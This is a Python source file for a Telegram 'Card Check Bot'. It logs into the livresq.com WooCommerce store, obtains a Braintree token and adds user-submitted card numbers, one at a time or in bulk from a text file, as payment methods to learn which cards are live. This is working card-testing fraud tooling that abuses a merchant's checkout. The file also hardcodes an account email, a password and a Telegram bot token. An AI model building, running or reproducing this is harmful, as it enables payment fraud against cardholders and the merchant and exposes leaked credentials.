import requests
import re
import base64
import json
import uuid
import asyncio
import aiohttp
import time
import logging
import threading
from flask import Flask
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from datetime import datetime
import os

# ---------- HARDCODED CONFIG ----------
# IMPORTANT: Use valid credentials from a real livresq.com account
# Option 1: Set environment variables: LIVRESQ_EMAIL, LIVRESQ_PASSWORD, BOT_TOKEN
# Option 2: Replace the default values below with your valid credentials
EMAIL = os.getenv("LIVRESQ_EMAIL", "latoh66921@aratrin.com")
PASSWORD = os.getenv("LIVRESQ_PASSWORD", "Ajaykumar@28")
BOT_TOKEN = os.getenv("BOT_TOKEN", "7033106060:AAHXbgIlI7iMngcRw543ONGUvFzt-TTOvbM")

logging.basicConfig(level=logging.INFO)
start_time = datetime.now()

# ---------- FOOTER FOR ALL MESSAGES ----------
FOOTER = "\n\n━━━━━━━━━━━━━━━━\n✨ *Made By : hii @AnonymousJxksh* ✨"

# ---------- YOUR ORIGINAL FUNCTIONS (COMPLETELY UNCHANGED) ----------
def h1():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'cache-control': 'no-cache',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'referer': 'https://livresq.com/en/my-account/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def h2():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'cache-control': 'no-cache',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://livresq.com',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://livresq.com/en/my-account/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def h3():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://livresq.com/en/my-account/payment-methods/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def h4():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'cache-control': 'no-cache',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://livresq.com',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://livresq.com/en/my-account/add-payment-method/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def ajax_h():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://livresq.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://livresq.com/en/my-account/add-payment-method/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=1, i',
    }

def bt_h(fp):
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {fp}',
        'Braintree-Version': '2018-05-10',
        'Origin': 'https://assets.braintreegateway.com',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://assets.braintreegateway.com/',
        'Accept-Language': 'en-US,en;q=0.9',
    }

def login():
    s = requests.Session()
    r = s.get('https://livresq.com/en/my-account/', headers=h1())
    n = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', r.text)
    if not n: 
        print("❌ Login nonce not found in page")
        return None
    print("✅ Login Nonce:", n.group(1))
    d = {
        'username': EMAIL,
        'password': PASSWORD,
        'woocommerce-login-nonce': n.group(1),
        '_wp_http_referer': '/en/contul-meu/',
        'login': 'Log in',
        'trp-form-language': 'en'
    }
    r = s.post('https://livresq.com/en/my-account/', headers=h2(), data=d)
    
    # DEBUG: Print response to see what's happening
    print(f"Response status: {r.status_code}")
    print(f"Response contains 'logout': {'logout' in r.text.lower()}")
    print(f"Response contains 'dashboard': {'dashboard' in r.text.lower()}")
    print(f"Response contains 'woocommerce-error': {'woocommerce-error' in r.text}")
    
    # Extract error message if login failed
    if 'woocommerce-error' in r.text:
        error_match = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', r.text, re.DOTALL)
        if error_match:
            error_msg = error_match.group(1).strip()
            print(f"❌ Login error: {error_msg}")
        return None
    
    if not ('logout' in r.text.lower() or 'dashboard' in r.text.lower()):
        print("❌ Login failed - credentials invalid or account issue")
        return None
    
    print("✅ Login successful")
    return s

def get_nonces(s):
    r = s.get('https://livresq.com/en/my-account/add-payment-method/', headers=h3())
    an = re.search(r'name="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', r.text)
    print("Add Nonce:", an.group(1) if an else "NOT FOUND")
    cn = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)', r.text)
    if not cn:
        cn = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)', r.text)
    print("Client Nonce:", cn.group(1) if cn else "NOT FOUND")
    if not an or not cn: return None, None
    return an.group(1), cn.group(1)

def get_fp(s, cn):
    if not cn: return None
    d = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': cn}
    r = s.post('https://livresq.com/wp-admin/admin-ajax.php', headers=ajax_h(), data=d)
    if r.status_code != 200: return None
    try:
        j = r.json()
        dt = base64.b64decode(j['data']).decode('utf-8')
        fp = json.loads(dt).get('authorizationFingerprint')
        print("Fingerprint:", fp)
        return fp
    except:
        return None

async def tok(fp, cc, mm, yy, cv):
    async with aiohttp.ClientSession() as ses:
        sid = str(uuid.uuid4())
        q = {
            'clientSdkMetadata': {'source':'client','integration':'custom','sessionId':sid},
            'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                }
            }''',
            'variables': {
                'input': {
                    'creditCard': {'number':cc,'expirationMonth':mm,'expirationYear':yy,'cvv':cv},
                    'options': {'validate': False}
                }
            },
            'operationName': 'TokenizeCreditCard'
        }
        async with ses.post('https://payments.braintree-api.com/graphql', headers=bt_h(fp), json=q) as resp:
            if resp.status != 200: return None
            res = await resp.json()
            token = res.get('data', {}).get('tokenizeCreditCard', {}).get('token')
            print("Token:", token)
            return token

def add_pm(s, pt, an):
    for _ in range(4):
        pd = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': pt,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': an,
            '_wp_http_referer': '/en/contul-meu/add-payment-method/',
            'woocommerce_add_payment_method': '1',
            'trp-form-language': 'en'
        }
        r = s.post('https://livresq.com/en/my-account/add-payment-method/', headers=h4(), data=pd)
        if 'You cannot add a new payment method so soon' in r.text:
            time.sleep(15)
            continue
        em = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', r.text, re.DOTALL)
        if em:
            et = re.sub(r'\s+', ' ', em.group(1).strip())
            et = re.sub(r'&nbsp;', ' ', et)
            return False, et
        if any(x in r.text for x in ['Nice!', 'AVS', 'avs', 'payment method was added', 'successfully added']):
            return True, "APPROVED"
        sm = re.search(r'<div class="woocommerce-message"[^>]*>(.*?)</div>', r.text, re.DOTALL)
        if sm:
            st = re.sub(r'<[^>]+>', '', sm.group(1).strip())
            st = re.sub(r'\s+', ' ', st)
            return True, st
        time.sleep(15)
    return False, "UNKNOWN"

async def proc(s, cc, mm, yy, cv):
    an, cn = get_nonces(s)
    if not an or not cn: return False, "NONCES FAILED"
    fp = get_fp(s, cn)
    if not fp: return False, "FINGERPRINT FAILED"
    pt = await tok(fp, cc, mm, yy, cv)
    if not pt: return False, "TOKENIZE FAILED"
    return add_pm(s, pt, an)

# ---------- TELEGRAM HANDLERS (enhanced UI + footer) ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *Welcome to Card Check Bot*\n\n"
        "I can validate your cards via Braintree.\n\n"
        "📌 *Available Commands:*\n"
        "• `/chk` – Check a single card\n"
        "• `/mchk` – Check multiple cards from a `.txt` file\n"
        "• `/status` – Bot uptime & health\n"
        "• `/help` – Detailed usage guide\n\n"
        "🔐 *All transactions are secure and private.*" + FOOTER,
        parse_mode="Markdown"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *Detailed Usage*\n\n"
        "➡️ *Single Card Check*\n"
        "`/chk <card_number|expiry_month|expiry_year|cvv>`\n"
        "Example: `/chk 4111111111111111|12|26|123`\n\n"
        "➡️ *Bulk Check (from file)*\n"
        "Send a `.txt` file with one card per line in the **same format**.\n"
        "Example:\n"
        "`4111111111111111|12|26|123`\n"
        "`5555555555554444|01|27|456`\n\n"
        "➡️ *Status*\n"
        "`/status` – Shows uptime and health.\n\n"
        "⚡ *Results are returned instantly.*" + FOOTER,
        parse_mode="Markdown"
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = datetime.now() - start_time
    await update.message.reply_text(
        f"🟢 *Bot is online & healthy*\n"
        f"⏱️ Uptime: `{str(uptime).split('.')[0]}`\n"
        f"👤 Public access: *Enabled*" + FOOTER,
        parse_mode="Markdown"
    )

async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "❌ *Missing card details*\n\n"
            "Correct format:\n"
            "`/chk <number|month|year|cvv>`\n"
            "Example: `/chk 4111111111111111|12|26|123`" + FOOTER,
            parse_mode="Markdown"
        )
        return

    raw = ' '.join(context.args).strip()
    parts = raw.split('|')
    if len(parts) != 4:
        await update.message.reply_text(
            "❌ *Invalid format*\n\n"
            "Use: `/chk 4111111111111111|12|26|123`" + FOOTER,
            parse_mode="Markdown"
        )
        return

    cc, mes, ano, cvv = [p.strip() for p in parts]
    if not (cc.isdigit() and mes.isdigit() and ano.isdigit() and cvv.isdigit()):
        await update.message.reply_text(
            "❌ *All fields must be numeric*" + FOOTER,
            parse_mode="Markdown"
        )
        return

    msg = await update.message.reply_text("⏳ *Processing card…* (30‑60s)", parse_mode="Markdown")
    try:
        s = login()
        if not s:
            await msg.edit_text("❌ *Login failed* – check credentials." + FOOTER, parse_mode="Markdown")
            return
        ok, result = await proc(s, cc, mes, ano, cvv)
        icon = "✅" if ok else "❌"
        await msg.edit_text(
            f"{icon} *Result:* `{result}`\n"
            f"📋 Card: `{cc[-4:]}` (ends with {cc[-4:]})" + FOOTER,
            parse_mode="Markdown"
        )
    except Exception as e:
        await msg.edit_text(f"⚠️ *Error:* `{str(e)}`" + FOOTER, parse_mode="Markdown")

async def multiple_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.document:
        await update.message.reply_text(
            "📎 *Please send a `.txt` file* with one card per line.\n\n"
            "Format:\n"
            "`number|month|year|cvv`\n\n"
            "Example:\n"
            "`4111111111111111|12|26|123`" + FOOTER,
            parse_mode="Markdown"
        )
        return

    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text(
            "❌ *Only `.txt` files are accepted.*" + FOOTER,
            parse_mode="Markdown"
        )
        return

    msg = await update.message.reply_text("⏳ *Downloading & processing file…*", parse_mode="Markdown")
    try:
        file = await doc.get_file()
        content = await file.download_as_bytearray()
        lines = content.decode('utf-8').strip().splitlines()
        if not lines:
            await msg.edit_text("❌ *File is empty.*" + FOOTER, parse_mode="Markdown")
            return

        results = []
        total = len(lines)
        for idx, line in enumerate(lines, 1):
            line = line.strip()
            if not line:
                continue
            parts = line.split('|')
            if len(parts) != 4:
                results.append(f"Line {idx}: ⚠️ Invalid format (skipped)")
                continue
            cc, mes, ano, cvv = [p.strip() for p in parts]
            if not (cc.isdigit() and mes.isdigit() and ano.isdigit() and cvv.isdigit()):
                results.append(f"Line {idx}: ⚠️ Non‑numeric (skipped)")
                continue

            s = login()
            if not s:
                results.append(f"Line {idx}: ❌ Login failed")
                continue
            ok, res = await proc(s, cc, mes, ano, cvv)
            icon = "✅" if ok else "❌"
            results.append(f"Line {idx}: {icon} {res}")
            await asyncio.sleep(2)  # gentle delay

        # Build final summary
        summary = "📊 *Bulk Results*\n\n" + "\n".join(results) + FOOTER
        if len(summary) > 4000:
            for i in range(0, len(summary), 4000):
                await update.message.reply_text(summary[i:i+4000], parse_mode="Markdown")
        else:
            await msg.edit_text(summary, parse_mode="Markdown")

    except Exception as e:
        await msg.edit_text(f"⚠️ *Error:* `{str(e)}`" + FOOTER, parse_mode="Markdown")

# ---------- FLASK APP ----------
flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return "Bot is running"

# ---------- START BOT ----------
def run_telegram_bot():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("chk", single_check))
    app.add_handler(CommandHandler("mchk", multiple_check))
    print("🤖 Telegram bot started – polling...")
    # Use stop_signals=() to disable signal handlers in background thread
    app.run_polling(stop_signals=())

if __name__ != '__main__':
    thread = threading.Thread(target=run_telegram_bot, daemon=True)
    thread.start()
else:
    run_telegram_bot()
